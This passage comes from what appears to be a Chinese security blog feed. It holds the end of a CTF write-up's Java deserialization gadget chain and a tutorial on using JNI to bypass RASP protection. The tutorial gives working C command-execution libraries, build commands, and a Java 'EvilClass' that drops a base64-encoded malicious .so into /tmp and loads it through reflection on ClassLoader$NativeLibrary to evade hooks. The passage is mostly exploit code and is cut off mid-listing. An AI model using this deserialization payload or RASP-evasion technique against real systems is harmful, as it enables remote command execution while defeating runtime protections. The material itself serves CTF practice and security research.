class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode jsonNodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>proxyObj<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException exp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field val <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exp<span class="token punctuation">,</span>jsonNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayOutputStream barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String res <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> String field<span class="token punctuation">,</span> Object arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        Field f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231123210556-iee3weu.png" alt="image">​</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java安全--JNI绕过RASP</title>
      <link href="/2023/11/23/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/"/>
      <url>/2023/11/23/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/</url>
      
        <content type="html"><![CDATA[<h1 id="Java安全–JNI绕过RASP"><a href="#Java安全–JNI绕过RASP" class="headerlink" title="Java安全–JNI绕过RASP"></a>Java安全–JNI绕过RASP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>绕过RASP在Java题目中已经给薄纱好多次了，这次遇到了题目好好看看</p><h2 id="JNI介绍"><a href="#JNI介绍" class="headerlink" title="JNI介绍"></a>JNI介绍</h2><p>JNI（Java Native Interface），其作用是让Java程序去调用C的程序，相当于Java和C的通道。在初学C语言的理解中C执行程序是把C语言编译成exe或ELF可执行文件然后调用可执行文件执行相关程序，但是这里的JNI是通过调用C包装的DLL动态链接库封装的方法去执行的，Java本身就是基于C实现的，所以Java底层也会教频繁地调用JNI。其实就是调用Native代码（用C语言实现的方法）。</p><p>借用（<a href="https://www.cnblogs.com/nice0e3/p/14067160.html">Java安全之JNI绕过RASP - nice_0e3 - 博客园 (cnblogs.com)</a>）的一张图</p><p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123120715-a07ge5i.png" alt="image">​</p><p>以下实验使用jdk8u65实现，JDK10后的高版本似乎删去了javah</p><p>我这里利用javah编译<code>.h</code>​文件</p><p>首先我们需要一个native修饰的java文件：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">nativeMethod</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        Test test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        test<span class="token punctuation">.</span><span class="token function">nativeMethod</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>使用<code>javac Test.java</code>​编译文件</p><p>使用<code>javah -jni Test</code>​编译生成.h文件</p><p>javah工具用于生成与JNI相关的C头文件，这个头文件可以用于在本地代码中实现Java类的本地方法。</p><p>三个文件如图所示：</p><p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123123353-zbcwcpp.png" alt="image">​</p><p>Test.h:</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* DO NOT EDIT THIS FILE - it is machine generated */</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;jni.h></span></span><span class="token comment" spellcheck="true">/* Header for class Test */</span><span class="token macro property">#<span class="token directive keyword">ifndef</span> _Included_Test</span><span class="token macro property">#<span class="token directive keyword">define</span> _Included_Test</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> __cplusplus</span><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span class="token comment" spellcheck="true">/* * Class:     Test * Method:    nativeMethod * Signature: (Ljava/lang/String;)V */</span>JNIEXPORT <span class="token keyword">void</span> JNICALL <span class="token function">Java_Test_nativeMethod</span>  <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span><span class="token punctuation">,</span> jobject<span class="token punctuation">,</span> jstring<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> __cplusplus</span><span class="token punctuation">}</span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span class="token macro property">#<span class="token directive keyword">endif</span></span></code></pre><p>‍</p><p>然后我们编写一个calc.c用于调用这个Test.h</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"Test.h"</span></span>JNIEXPORT <span class="token keyword">void</span> JNICALL <span class="token function">Java_Test_nativeMethod</span><span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">,</span> jstring command<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetStringUTFChars</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> command<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取命令失败，直接返回</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Executing command: %s\n"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 执行命令</span>    <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">ReleaseStringUTFChars</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> command<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 释放内存</span><span class="token punctuation">}</span></code></pre><p>Win执行:</p><pre class=" language-cmd"><code class="language-cmd">gcc -I"%JAVA_HOME%\include" -I"%JAVA_HOME%\include\win32" -shared -o libcmd.dll calc.c</code></pre><p>Linux执行</p><pre class=" language-shell"><code class="language-shell">gcc -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -shared -o libcmd.so calc.c</code></pre><p>添加一个加载dll或者so文件</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">nativeMethod</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\HP\\Downloads\\bypassJava\\Test\\libcmd.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Test test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        test<span class="token punctuation">.</span><span class="token function">nativeMethod</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>使用javac Test.java编译后</p><p>运行java Test弹出计算器：</p><p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123124231-6nyf3ls.png" alt="image">​</p><p>‍</p><p>步骤可以归纳为如下的五步：</p><ol><li>编写一个 java 文件，其中定义一个 native 方法，然后使用 javac 编译得到 .class 文件</li><li>使用 javah 进行对 .class 文件进行处理，得到编写 C 代码所需的头文件。</li><li>编写命令执行的 C 语言实现</li><li>将编写的 C 代码编译为 lib 或者 dll（注意jdk版本要与目标机器的jdk保持一致,经过测试大版本一致即可）</li><li>编写一个 Java 类调用 System.loadLibrary 方法加载 dll 文件。</li></ol><p>‍</p><h2 id="RASP介绍"><a href="#RASP介绍" class="headerlink" title="RASP介绍"></a>RASP介绍</h2><p>RASP（Run­time Ap­pli­ca­tion Self-Pro­tec­tion），实时程序自我保护。RASP可以监控实时危险方法调用，实现原理也很底层。Java RASP 通常使用 java agent 技术实现，例github项目地址 <a href="https://github.com/chaitin/log4j2-vaccine%E3%80%82">https://github.com/chaitin/log4j2-vaccine。</a></p><p>实现主要通过Hook掉了一些<code>恶意类</code>​​，比如<code>Runtime</code>​​、<code>ProcessBuilder</code>​​。<code>Runtime.exec</code>​​调用的是<code>ProcessBuilder.start</code>​​,<code>ProcessBuilder.start</code>​​的底层会调用<code>ProcessImpl</code>​​类。那么这时候只需要去Hook掉<code>ProcessImpl</code>​​就无法进行执行命令了。</p><p>‍</p><h2 id="绕过RASP"><a href="#绕过RASP" class="headerlink" title="绕过RASP"></a>绕过RASP</h2><h3 id="system-load"><a href="#system-load" class="headerlink" title="system.load"></a>system.load</h3><p>像上面JNI中利用的方法是<code>system.load</code>​来加载dll或者so文件的，以此可以绕过ProcessImpl类被Hook的情况</p><h3 id="反射NativeLibrary"><a href="#反射NativeLibrary" class="headerlink" title="反射NativeLibrary"></a>反射NativeLibrary</h3><p>如果类<code>loadLibrary0</code>​也被Hook了，那么是无法使用<code>system.load</code>​来绕过的</p><p>讨论一种新的方法：反射调用 <code>java.lang.ClassLoader.NativeLibrary</code>​ 中的 <code>load</code>​ 方法来加载恶意so文件执行命令</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>System.load下面是利用load0来加载的</p><p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212232-ck8vo4r.png" alt="image">​</p><p>跟进load0</p><p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212303-coyrnho.png" alt="image">​</p><p>跟进更底层方法loadLibrary</p><p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212329-zwpsii5.png" alt="image">​</p><p>发现还有一个更底层的loadLibrary0，而且loadLibrary0不是最底层的方法</p><p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212416-ek16rzp.png" alt="image">​</p><p>再往下还有一个NativeLibrary，可以看到他也调用了一个loaded</p><p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212520-44ye9r4.png" alt="image">​</p><p>跟进这个方法发现他有一个load方法，所以从这里开始反射调用恶意的so文件</p><p>java恶意类</p><p>EvilClass.java:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span>  <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">native</span> String <span class="token function">execCmd</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编译：</p><pre class=" language-cmd"><code class="language-cmd">javac EvilClass.javajavah EvilClass</code></pre><p>编写C文件：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"EvilClass.h"</span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">execmd</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//定义缓冲区</span>    FILE <span class="token operator">*</span>pipe <span class="token operator">=</span> <span class="token function">_popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//打开管道，并执行命令</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pipe<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回0表示运行失败</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> pipe<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//将管道输出到result中</span>            <span class="token function">strcat</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">_pclose</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关闭管道</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//返回1表示运行成功</span><span class="token punctuation">}</span>JNIEXPORT jstring JNICALL <span class="token function">Java_com_test_Command_exec</span><span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject class_object<span class="token punctuation">,</span> jstring jstr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cstr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetStringUTFChars</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> jstr<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> result<span class="token punctuation">[</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义存放结果的字符串数组</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token function">execmd</span><span class="token punctuation">(</span>cstr<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">// printf(result);</span>    <span class="token punctuation">}</span>    <span class="token keyword">char</span> return_messge<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>return_messge<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    jstring cmdresult <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">NewStringUTF</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> return_messge<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//system();</span>    <span class="token keyword">return</span> cmdresult<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>接下来就是编译了：</p><p>win:</p><pre class=" language-cmd"><code class="language-cmd">gcc -I"%JAVA_HOME%\include" -I"%JAVA_HOME%\include\win32" -shared -o libcmd.dll Evil.c</code></pre><p>linux:</p><pre class=" language-shell"><code class="language-shell">gcc -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -shared -o libcmd.so Evil.c</code></pre><p>然后就是获取一下这个文件的base64的值，把他和内存马放一起：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>WebApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span>RequestContextHolder<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>RequestMappingInfo<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RequestMappingHandlerMapping<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>RandomAccessFile<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Vector<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">native</span> String <span class="token function">execCmd</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//恶意动态链接库文件的base64编码</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String EVIL_JNI_BASE64 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LIB_PATH <span class="token operator">=</span> <span class="token string">"/tmp/libcmd.so"</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> jniBytes <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>EVIL_JNI_BASE64<span class="token punctuation">)</span><span class="token punctuation">;</span>            RandomAccessFile randomAccessFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RandomAccessFile</span><span class="token punctuation">(</span>LIB_PATH<span class="token punctuation">,</span> <span class="token string">"rw"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            randomAccessFile<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>jniBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            randomAccessFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库</span>            ClassLoader cmdLoader <span class="token operator">=</span> EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> classLoaderClazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nativeLibraryClazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader$NativeLibrary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Method load <span class="token operator">=</span> nativeLibraryClazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"load"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            load<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Field field <span class="token operator">=</span> classLoaderClazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"nativeLibraries"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Vector<span class="token operator">&lt;</span>Object<span class="token operator">></span> libs <span class="token operator">=</span> <span class="token punctuation">(</span>Vector<span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cmdLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>            Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nativeLibraryCons <span class="token operator">=</span> nativeLibraryClazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token 